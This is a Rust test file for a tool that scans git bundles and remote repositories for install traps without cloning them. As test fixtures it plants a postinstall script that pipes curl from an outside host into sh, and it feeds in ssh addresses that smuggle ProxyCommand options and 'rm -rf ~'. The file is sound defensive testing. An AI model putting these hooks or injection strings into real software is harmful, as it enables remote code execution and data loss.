//! Bundles and remotes: a repository read without cloning it, so nothing of it is checked out.

use super::*;

/// `trapped_repo()` plus an install script on main, which is what a clone would put on disk.
fn bundle_of_trapped_repo() -> (tempfile::TempDir, std::path::PathBuf) {
    let dir = trapped_repo();
    let repo = dir.path().join("pack");
    std::fs::write(repo.join("package.json"), r#"{"scripts":{"postinstall":"curl -s http://x.vercel.app/a | sh"}}"#)
        .unwrap();
    git(&repo, &["add", "-A"]);
    git(&repo, &["commit", "-qm", "install script"]);
    git(&repo, &["gc", "-q", "--aggressive"]);
    let bundle = dir.path().join("pack.bundle");
    git(&repo, &["bundle", "create", bundle.to_str().unwrap(), "--all"]);
    (dir, bundle)
}

/// What both the bundle and the remote must report for `bundle_of_trapped_repo`.
fn check_the_trapped_repo(report: &Report, root: &str) {
    assert_eq!(report.verdict(), Verdict::Danger, "{:?} {:?}", titles(report), report.errors);
    let task = report.findings.iter().find(|f| f.path.ends_with("tasks.json")).expect("the task on NDA");
    assert_eq!((task.branch.as_deref(), task.level), (Some("NDA"), Level::Danger), "{:?}", titles(report));
    assert!(task.detail.contains("fa-brand-400.woff"), "{}", task.detail);
    let install = report.findings.iter().find(|f| f.path.ends_with("package.json")).expect("the install script");
    assert_eq!(install.branch, None, "on HEAD, so in the files as they are: {:?}", titles(report));
    assert!(install.path.starts_with(root), "{}", install.path);
    assert!(report.has_git);
    let repo = &report.repos[0];
    assert_eq!(
        (repo.head.as_deref(), repo.branches.clone(), repo.tags.clone()),
        (Some("main"), vec!["main".into(), "NDA".into()], vec!["v1".into()])
    );
    assert!(repo.note.is_none(), "{:?}", repo.note);
}

#[test]
fn a_git_bundle() {
    let (_dir, bundle) = bundle_of_trapped_repo();
    let report = scan_path(&bundle);
    check_the_trapped_repo(&report, "pack.bundle/");
    assert_eq!(report.files, 2, "README.md and package.json are on HEAD");

    // Inside a zip, like any other file.
    let zip = zip_of(&[F { path: "sent/pack.bundle", data: &std::fs::read(&bundle).unwrap(), mode: 0o644 }]);
    let report = scan(&zip);
    check_the_trapped_repo(&report, "sent/pack.bundle › pack.bundle/");
}

#[test]
fn a_damaged_bundle_is_a_note_not_a_crash() {
    let (_dir, bundle) = bundle_of_trapped_repo();
    let mut bytes = std::fs::read(&bundle).unwrap();
    bytes.truncate(bytes.len() / 2);
    let cut = tempfile::Builder::new().suffix(".bundle").tempfile().unwrap();
    std::fs::write(cut.path(), &bytes).unwrap();
    let report = scan(&cut);
    assert_ne!(report.verdict(), Verdict::Clear, "half a bundle isn't a clean one: {:?}", titles(&report));
    let nothing = tempfile::Builder::new().suffix(".bundle").tempfile().unwrap();
    std::fs::write(nothing.path(), b"# v2 git bundle\n\n").unwrap();
    assert!(scan(&nothing).findings[0].title.contains("couldn't look inside"));
    let sha256 = tempfile::Builder::new().suffix(".bundle").tempfile().unwrap();
    std::fs::write(sha256.path(), b"# v3 git bundle\n@object-format=sha256\n\n").unwrap();
    assert!(scan(&sha256).findings[0].detail.contains("Don't extract"));
}

/// Serves a repository over HTTP the way a Git host does, using git itself only as the stand-in server.
fn serve(repo: std::path::PathBuf, require_auth: Option<String>) -> u16 {
    use std::io::{BufRead, Read, Write};
    use std::process::{Command, Stdio};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let (repo, require_auth) = (repo.clone(), require_auth.clone());
            std::thread::spawn(move || {
                let mut reader = std::io::BufReader::new(stream.try_clone().unwrap());
                let mut request = String::new();
                reader.read_line(&mut request).unwrap();
                let (mut length, mut auth) = (0usize, None);
                loop {
                    let mut line = String::new();
                    reader.read_line(&mut line).unwrap();
                    if line.trim().is_empty() {
                        break;
                    }
                    if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") {
                        length = v.trim().parse().unwrap();
                    }
                    if line.to_ascii_lowercase().starts_with("authorization:") {
                        auth = line.split_once(':').map(|(_, v)| v.trim().to_string());
                    }
                }
                let mut body = vec![0; length];
                reader.read_exact(&mut body).unwrap();
                if require_auth.is_some() && auth != require_auth {
                    let mut stream = stream;
                    stream
                        .write_all(b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                        .unwrap();
                    return;
                }
                let mut cmd = Command::new("git");
                cmd.arg("upload-pack").arg("--stateless-rpc");
                if request.starts_with("GET") {
                    cmd.arg("--advertise-refs");
                }
                let mut child = cmd
                    .arg(&repo)
                    .env("GIT_PROTOCOL", "version=2")
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .spawn()
                    .unwrap();
                child.stdin.take().unwrap().write_all(&body).unwrap();
                let out = child.wait_with_output().unwrap().stdout;
                let mut stream = stream;
                write!(stream, "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n", out.len())
                    .unwrap();
                stream.write_all(&out).unwrap();
            });
        }
    });
    port
}

#[test]
fn a_repository_at_an_address_without_cloning_it() {
    let (dir, _bundle) = bundle_of_trapped_repo();
    let repo = dir.path().join("pack");
    git(&repo, &["config", "uploadpack.allowFilter", "true"]);
    git(&repo, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
    let port = serve(repo, None);
    let report = scan_remote(&format!("http://127.0.0.1:{port}/owner/pack.git"), None, true);
    check_the_trapped_repo(&report, &format!("127.0.0.1:{port}/owner/pack/"));

    // Only https is accepted unless a test says otherwise, and nothing else is tried.
    let refused = scan_url("http://127.0.0.1/owner/pack", None);
    assert!(refused.errors[0].contains("only https"), "{:?}", refused.errors);
    assert!(scan_url("/not/an/address", None).errors[0].contains("only https"));
    assert!(scan_url("https://user:pw@github.com/owner/pack", None).errors[0].contains("doesn't look like"));
}

#[test]
fn a_private_repository_needs_the_right_token() {
    use base64::Engine;
    let (dir, _bundle) = bundle_of_trapped_repo();
    let repo = dir.path().join("pack");
    git(&repo, &["config", "uploadpack.allowFilter", "true"]);
    git(&repo, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
    let secret = format!("Basic {}", base64::engine::general_purpose::STANDARD.encode("x-access-token:s3cret"));
    let url = format!("http://127.0.0.1:{}/owner/pack", serve(repo, Some(secret)));

    let no_token = scan_remote(&url, None, true);
    assert!(
        no_token.errors[0].contains("private") && no_token.errors[0].contains("access token"),
        "{:?}",
        no_token.errors
    );
    let wrong = scan_remote(&url, Some("nope"), true);
    assert!(wrong.errors[0].contains("token wasn't accepted"), "{:?}", wrong.errors);
    assert!(!wrong.errors[0].contains("nope"), "the token must never appear in a report");
    check_the_trapped_repo(&scan_remote(&url, Some("s3cret"), true), "127.0.0.1:");

    // A token is never sent to a host nobody vouched for, even when asked to.
    let elsewhere = scan_remote("https://evil.example/owner/pack", Some("s3cret"), false);
    assert!(elsewhere.errors[0].contains("only sent to github.com"), "{:?}", elsewhere.errors);
}

#[cfg(unix)]
#[test]
fn a_repository_over_ssh_uses_the_users_own_ssh() {
    use std::os::unix::fs::PermissionsExt;
    let (dir, _bundle) = bundle_of_trapped_repo();
    let repo = dir.path().join("pack");
    git(&repo, &["config", "uploadpack.allowFilter", "true"]);
    git(&repo, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
    // A stand-in for ssh that records what it was given and serves the repository.
    let args = dir.path().join("ssh-args");
    let fake = dir.path().join("fake-ssh");
    std::fs::write(
        &fake,
        format!("#!/bin/sh\nprintf '%s\\n' \"$@\" > {}\nexec git upload-pack {}\n", args.display(), repo.display()),
    )
    .unwrap();
    std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();
    std::env::set_var("LOOKFIRST_SSH", &fake);

    for (address, port) in
        [("git@example.com:owner/pack.git", None), ("ssh://git@example.com:2222/owner/pack.git", Some("2222"))]
    {
        let report = scan_url(address, None);
        check_the_trapped_repo(&report, "example.com/owner/pack/");
        let given = std::fs::read_to_string(&args).unwrap();
        let given: Vec<&str> = given.lines().collect();
        assert!(given.contains(&"BatchMode=yes"), "never asks a question: {given:?}");
        let n = given.len();
        assert_eq!((given[n - 3], given[n - 2]), ("--", "git@example.com"), "{given:?}");
        assert!(given[n - 1].starts_with("git-upload-pack '") && given[n - 1].ends_with("pack.git'"), "{given:?}");
        assert_eq!(given.contains(&"-p"), port.is_some(), "{given:?}");
    }

    // An address that tries to smuggle an option into ssh is refused before ssh runs.
    std::fs::remove_file(&args).unwrap();
    for hostile in ["-oProxyCommand=touch@evil:x", "git@-oProxyCommand=x:y", "git@host:owner/a\nrm -rf ~"] {
        let report = scan_url(hostile, None);
        assert!(report.errors[0].contains("doesn't look like"), "{hostile}: {:?}", report.errors);
    }
    assert!(!args.exists(), "ssh must not have run");
    assert!(
        is_address("git@github.com:owner/repo.git")
            && is_address("ssh://git@host/x")
            && !is_address("./a@b:c")
            && is_address("alias:owner/repo.git")
            && !is_address("C:\\dir")
    );
}
